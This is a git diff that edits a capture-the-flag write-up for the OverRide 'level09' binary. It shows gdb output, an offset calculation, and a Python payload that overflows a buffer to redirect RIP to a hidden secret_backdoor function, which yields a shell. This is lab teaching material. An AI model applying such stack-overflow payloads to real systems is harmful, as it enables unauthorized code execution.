@@ -1,9 +1,9 @@
 # Level 09
 
-Once logged in, you will see a binary
+Once logged in, you will see a binary.
 
 ```
-$ ssh localhost -p 4242 -l level09
+$ ssh localhost -p 4444 -l level09
 	   ____                  ____  _     __
 	  / __ \_   _____  _____/ __ \(_)___/ /__
 	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
@@ -19,10 +19,9 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
 level09@OverRide:~$ ls
 level09
-level09@OverRide:~$
 ```
 
-by running the program, the prompt opens for asking a name, and message to send to `@Unix-Dude`
+By running the program, the prompt opens for asking a name, and message to send to `@Unix-Dude`.
 
 ```
 level09@OverRide:~$ ./level09
@@ -38,15 +37,11 @@ level09@OverRide:~$ ./level09
 level09@OverRide:~$
 ```
 
-By decompiling the binary, there are a function that never called, name `secret_backdoor`, which gets user input and stores into the buffer(local variable), and calles `system()` function with the buffer. also, the program uses `fgets()`, `printf()`, `strncpy()` throughout the program, so there may be a chance to exploit the program with buffer overflow.
+By decompiling the binary, there are a function that is never called named `secret_backdoor` that gets user input and stores it into the buffer (a local variable), and finally it calls the `system()` function with the buffer. The program uses `fgets()`, `printf()`, `strncpy()` throughout the program, so there may be a chance to exploit the program with buffer overflow.
 
+In the decompiled source, we find that the `set_username` function takes `0x29` (`40`) bytes into the buffer. Because of the way the data is structured, we want to overwrite `i` to be `256` (`\xff`), so that the value initially set up, which is 140, will be able extend the copied length of `strncpy()`.
 
-XXXXXXXXXXXXXXXXXXXXXXX
-decompilation gives the set_username function will take `0x29 = 40` bytes into the buffer. the buffer after, we want to feed `256 = '\xff'`, so that the value initially set up, which is 140, will be able extend the length of `strncpy()`.
-XXXXXXXXXXXXXXXXXXXXXXX
-
-XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-We want to overwrite the rip (64 bits version of eip) to the address of the function `secret_backdoor`. but the address only will be right once you `run` the program.
+We want to overwrite the `RIP` register (64 bits version of `EIP`) to the address of the function `secret_backdoor`, and the address only will be correct once you call `run` with GDB.
 
 ```
 gdb-peda$ info functions
@@ -54,7 +49,7 @@ All defined functions:
 
 Non-debugging symbols:
 [...]
-0x000000000000088c  secret_backdoor 	; no bueno
+0x000000000000088c  secret_backdoor 	# no bueno
 [...]
 ```
 
@@ -69,10 +64,9 @@ All functions matching regular expression "secret_backdoor":
 Non-debugging symbols:
 0x000055555555488c  secret_backdoor
 ```
-XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
+Lastly, we need to find the offset to overwrite the `RIP` register. The reason we want to find `RIP` after calling `set_username` is that that's where all the input will be stored (into `buffer`).
 
-Lastly, we need to find the offset to overwrite `rip (64 bits ver. of eip)`. The reason we want to find `rip` after calling `set_username` is this is when all the input will be stored into the buffer.
 ```
    0x55555555490d <handle_msg+77>:	mov    rdi,rax
 => 0x555555554910 <handle_msg+80>:	call   0x5555555549cd <set_username>
@@ -92,28 +86,32 @@ Stack level 0, frame at 0x7fffffffe580:
 gdb-peda$ p/d 0x7fffffffe578 - 0x7fffffffe4b0
 $4 = 200
 ```
+
 So, the offset is `200`.
 
-Now, we want to have a payload, the payload will need to be structured as below:
+Our payload will be structured as follows:
 ```
-// struct FYI
-
+// // Provided for readability
 // struct {
 //		char buf_1[140];
 //		char buf_2[40];
 //		unsigned int num;
 // };
 
+# pseudocode
 [First 40 bytes random character] + [a value to overwrite a variable `num` in the struct] + [fill up rest of the buffer] + [address for function `secret_backdoor`]
 
+# working it out
 "A"*40 + 256(it can be any) + "B" * 200 (the offset) + 0x000055555555488c
-```
 
-```
+# prepping for action
 python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)' # I stands for unsigned int, L stands for unsigned long
 
+# ready for action!
 (python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)'; cat -) | ./level09
 ```
+
+And now in action!
 
 ```
 level09@OverRide:~$ (python -c 'import struct; print "A"*40 + "\xff\n" + "B"*200 + struct.pack("L", 0x000055555555488c)'; cat -) | ./level09
@@ -147,6 +145,8 @@ end@OverRide:~$ ./end
 ./end: line 1: GG: command not found
 end@OverRide:~$
 ```
+
+gg, Override!
 
 ```
   ________  ________
